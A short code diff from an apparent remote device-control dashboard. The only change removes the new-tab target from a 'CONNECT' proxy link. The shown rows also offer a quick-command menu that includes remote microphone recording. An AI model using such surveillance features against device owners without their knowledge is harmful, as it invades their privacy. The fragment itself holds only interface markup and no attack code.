@@ -458,7 +458,7 @@ app.get('/', (req, res) => {
                 <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
                 <td style="vertical-align: middle; white-space: nowrap;">
                     <div style="display: inline-flex; align-items: center; gap: 6px;">
-                        <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 5px 10px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a>
+                        <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 5px 10px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a>
                         <select onchange="dispatchQuickCommand('${d.deviceId}', this.value); this.selectedIndex=0;" style="background: rgba(0,242,255,0.08) !important; color: var(--neon-cyan) !important; border: 1px solid var(--neon-cyan) !important; font-size: 0.65rem !important; padding: 4px 6px !important; border-radius: 6px !important; cursor: pointer; outline: none; width: auto !important; height: auto !important;">
                             <option value="" disabled selected>⚡ ACTIONS</option>
                             <option value="mic">🎙️ Record Mic (60s)</option>
